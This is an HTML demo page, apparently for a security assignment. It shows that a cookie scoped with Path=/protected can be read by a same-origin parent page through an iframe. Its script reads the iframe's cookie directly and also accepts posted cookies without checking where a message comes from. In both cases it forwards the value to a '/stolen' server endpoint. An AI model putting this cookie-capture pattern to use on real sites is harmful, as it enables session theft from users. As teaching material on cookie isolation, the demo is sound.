<!doctype html>
<html lang=en>
<head>
  <meta charset="utf-8">
  <title>Parent page (Frame-Path demo)</title>
  <style>
    body { font-family: Arial, sans-serif; padding:18px; }
    pre { background:#f6f6f6; padding:10px; border:1px solid #ddd; overflow:auto; }
    .row { margin-bottom:12px; }
    button { margin-right:8px; }
  </style>
</head>
<body>
  <h1>Parent Page</h1>
  <p>Demo: the iframe below loads <code>/protected</code>. The server sets <code>sensitiveCookie</code> with <code>Path=/protected</code>.</p>

  <div class="row">
    <button id="btnSet">Open /protected/set in new tab (set cookie)</button>
    <button id="btnDirect">Try direct read from iframe</button>
    <button id="btnShowStored">Show last posted cookie from iframe</button>
  </div>

  <iframe id="victimFrame"
        src="/protected"
        title="Protected iframe (victim)"
        width="100%"
        height="320"
        style="border:1px solid #ccc"></iframe>

  <h3>Parent view: direct-read sensitiveCookie</h3>
  <pre id="out">(not read yet)</pre>

  <h3>Parent view: last posted cookie from iframe (postMessage)</h3>
  <pre id="posted">(none)</pre>

  <script>
    // parse cookie string for a single name (works for either the parent's cookie string or an iframe doc.cookie)
    function parseCookieStringFor(name, cookieString) {
      const pairs = (cookieString || '').split(';').map(p => p.trim()).filter(Boolean);
      for (const p of pairs) {
        const idx = p.indexOf('=');
        if (idx === -1) continue;
        const k = p.substring(0, idx);
        const v = p.substring(idx + 1);
        if (k === name) return decodeURIComponent(v);
      }
      return '(none)';
    }

    document.getElementById('btnSet').addEventListener('click', () => {
      // open the URL that sets the cookie (server route should set cookie)
      window.open('/protected/set', '_blank');
    });

    document.getElementById('btnDirect').addEventListener('click', () => {
      try {
        const f = document.getElementById('victimFrame');
        const cw = f.contentWindow;
        // note: direct same-origin read; works only if iframe is same origin and cookie not HttpOnly
        const dc = (cw && cw.document && cw.document.cookie) || '';
        const sensitive = parseCookieStringFor('sensitiveCookie', dc);
        document.getElementById('out').textContent = `Direct read (sensitiveCookie): ${sensitive}`;
        // optional: send the short value to the server /stolen for demo logging (safe for assignment)
        fetch('/stolen', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ via: 'direct', cookie: sensitive })
        }).catch(()=>{});
      } catch (err) {
        document.getElementById('out').textContent = '(direct read failed â€” cross-origin or other error)';
        console.warn(err);
      }
    });

    // receive messages posted by the iframe (postMessage)
    window.addEventListener('message', (ev) => {
      if (!ev.data || ev.data.type !== 'cookies') return;
      const c = ev.data.cookie || '(none)';
      document.getElementById('posted').textContent = `Iframe posted cookie: ${c}`;
      // optional: forward to server for logging
      fetch('/stolen', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ via: 'postMessage', cookie: c })
      }).catch(()=>{});
    });

    // optional: button to re-display last posted cookie (if you prefer)
    document.getElementById('btnShowStored').addEventListener('click', () => {
      const txt = document.getElementById('posted').textContent || '(none)';
      alert(txt);
    });
  </script>
</body>
</html>
